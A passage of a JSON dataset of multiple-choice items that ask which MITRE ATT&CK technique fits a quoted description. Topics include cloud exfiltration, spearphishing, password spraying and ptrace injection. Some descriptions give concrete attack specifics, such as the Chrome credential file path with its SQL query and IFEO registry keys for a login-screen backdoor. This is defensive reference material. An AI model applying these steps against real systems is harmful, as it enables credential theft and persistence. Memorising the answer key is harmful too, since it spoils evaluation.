      "question": "Answer which mitre technique is related to the description: Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nAdversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.",
      "options": "A. OS Credential Dumping: LSA Secrets, B. Execution Guardrails: Environmental Keying, C. Transfer Data to Cloud Account, D. Modify Authentication Process: Network Device Authentication",
      "choice": "C. Transfer Data to Cloud Account",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin.com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.\n\n**Note:** This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.\n\nA. System Binary Proxy Execution: Msiexec, B. User Execution, C. OS Credential Dumping: DCSync, D. Exfiltration Over Web Service: Exfiltration to Text Storage Sites\nA:",
    "context": "",
    "output": "D. Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin.com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.\n\n**Note:** This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.",
      "options": "A. System Binary Proxy Execution: Msiexec, B. User Execution, C. OS Credential Dumping: DCSync, D. Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
      "choice": "D. Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.\nA. Internal Spearphishing, B. Phishing: Spearphishing Attachment, C. Data from Local System, D. Indicator Removal: Timestomp",
    "context": "",
    "output": "B. Phishing: Spearphishing Attachment",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
      "options": "A. Internal Spearphishing, B. Phishing: Spearphishing Attachment, C. Data from Local System, D. Indicator Removal: Timestomp",
      "choice": "B. Phishing: Spearphishing Attachment",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).\n\nA. Account Manipulation: Additional Cloud Credentials, B. Archive Collected Data: Archive via Library, C. Search Closed Sources: Purchase Technical Data, D. File and Directory Permissions Modification\nAnswer:",
    "context": "",
    "output": "C. Search Closed Sources: Purchase Technical Data",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",
      "options": "A. Account Manipulation: Additional Cloud Credentials, B. Archive Collected Data: Archive via Library, C. Search Closed Sources: Purchase Technical Data, D. File and Directory Permissions Modification",
      "choice": "C. Search Closed Sources: Purchase Technical Data",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).\nA. Encrypted Channel, B. Steal or Forge Kerberos Tickets: Silver Ticket, C. System Binary Proxy Execution: Rundll32, D. Acquire Infrastructure: Botnet\nAnswer:",
    "context": "",
    "output": "D. Acquire Infrastructure: Botnet",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may buy, lease, or rent a network of compromised systems\u00a0that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).",
      "options": "A. Encrypted Channel, B. Steal or Forge Kerberos Tickets: Silver Ticket, C. System Binary Proxy Execution: Rundll32, D. Acquire Infrastructure: Botnet",
      "choice": "D. Acquire Infrastructure: Botnet",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.\n\nOptions:\nA. Modify Cloud Compute Infrastructure: Create Snapshot, B. Impair Defenses: Disable or Modify Tools, C. Modify Authentication Process: Network Device Authentication, D. Forced Authentication",
    "context": "",
    "output": "A. Modify Cloud Compute Infrastructure: Create Snapshot",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.",
      "options": "A. Modify Cloud Compute Infrastructure: Create Snapshot, B. Impair Defenses: Disable or Modify Tools, C. Modify Authentication Process: Network Device Authentication, D. Forced Authentication",
      "choice": "A. Modify Cloud Compute Infrastructure: Create Snapshot",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts.\n\n**Note:** This is distinct from Code Repositories, which focuses on conducting Reconnaissance via public code repositories.\nA. Impair Defenses: Disable or Modify System Firewall, B. Event Triggered Execution: Installer Packages, C. Content Injection, D. Data from Information Repositories: Code Repositories\nAnswer:",
    "context": "",
    "output": "D. Data from Information Repositories: Code Repositories",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts.\n\n**Note:** This is distinct from Code Repositories, which focuses on conducting Reconnaissance via public code repositories.",
      "options": "A. Impair Defenses: Disable or Modify System Firewall, B. Event Triggered Execution: Installer Packages, C. Content Injection, D. Data from Information Repositories: Code Repositories",
      "choice": "D. Data from Information Repositories: Code Repositories",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see Digital Certificates) or create self-signed certificates (see Digital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).\n\nA. Stage Capabilities: Install Digital Certificate, B. Hijack Execution Flow, C. Data Encrypted for Impact, D. Account Manipulation: Additional Container Cluster Roles\nA:",
    "context": "",
    "output": "A. Stage Capabilities: Install Digital Certificate",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see Digital Certificates) or create self-signed certificates (see Digital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).",
      "options": "A. Stage Capabilities: Install Digital Certificate, B. Hijack Execution Flow, C. Data Encrypted for Impact, D. Account Manipulation: Additional Container Cluster Roles",
      "choice": "A. Stage Capabilities: Install Digital Certificate",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).\n\nA. Command and Scripting Interpreter: JavaScript, B. System Binary Proxy Execution: Electron Applications, C. Proxy: Internal Proxy, D. Credentials from Password Stores: Credentials from Web Browsers\nAnswer:",
    "context": "",
    "output": "D. Credentials from Password Stores: Credentials from Web Browsers",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "options": "A. Command and Scripting Interpreter: JavaScript, B. System Binary Proxy Execution: Electron Applications, C. Proxy: Internal Proxy, D. Credentials from Password Stores: Credentials from Web Browsers",
      "choice": "D. Credentials from Password Stores: Credentials from Web Browsers",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. \n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.\nA. Account Discovery: Local Account, B. Data from Removable Media, C. Brute Force: Password Spraying, D. Obfuscated Files or Information: Binary Padding\nAnswer:",
    "context": "",
    "output": "C. Brute Force: Password Spraying",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. \n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "options": "A. Account Discovery: Local Account, B. Data from Removable Media, C. Brute Force: Password Spraying, D. Obfuscated Files or Information: Binary Padding",
      "choice": "C. Brute Force: Password Spraying",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction).  \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges. \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.\n\nA. Process Injection: Ptrace System Calls, B. System Location Discovery, C. Direct Volume Access, D. Unused/Unsupported Cloud Regions\nAnswer:",
    "context": "",
    "output": "A. Process Injection: Ptrace System Calls",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes\u2019 memory (ex: the current address of the next instruction).  \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges. \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",
      "options": "A. Process Injection: Ptrace System Calls, B. System Location Discovery, C. Direct Volume Access, D. Unused/Unsupported Cloud Regions",
      "choice": "A. Process Injection: Ptrace System Calls",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code. \n\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.\n\nPossible answers:\nA. Hijack Execution Flow: AppDomainManager, B. Modify Authentication Process: Multi-Factor Authentication, C. Phishing, D. Compromise Infrastructure: Domains",
    "context": "",
    "output": "A. Hijack Execution Flow: AppDomainManager",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code. \n\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.",
      "options": "A. Hijack Execution Flow: AppDomainManager, B. Modify Authentication Process: Multi-Factor Authentication, C. Phishing, D. Compromise Infrastructure: Domains",
      "choice": "A. Hijack Execution Flow: AppDomainManager",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). \n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. \n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).   Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>.  \n\nSimilar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges. \n\nSimilar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.\n\nPossible answers:\nA. Remote Services: SSH, B. Event Triggered Execution: Image File Execution Options Injection, C. Hijack Execution Flow: Path Interception by Unquoted Path, D. OS Credential Dumping: Security Account Manager",
    "context": "",
    "output": "B. Event Triggered Execution: Image File Execution Options Injection",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). \n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. \n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).   Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>.  \n\nSimilar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges. \n\nSimilar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.",
      "options": "A. Remote Services: SSH, B. Event Triggered Execution: Image File Execution Options Injection, C. Hijack Execution Flow: Path Interception by Unquoted Path, D. OS Credential Dumping: Security Account Manager",
      "choice": "B. Event Triggered Execution: Image File Execution Options Injection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages. The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.\n\nA. Exploitation for Credential Access, B. Data from Configuration Repository: SNMP (MIB Dump), C. Search Open Technical Databases: DNS/Passive DNS, D. Disk Wipe\nA:",
    "context": "",
    "output": "B. Data from Configuration Repository: SNMP (MIB Dump)",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages. The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.",
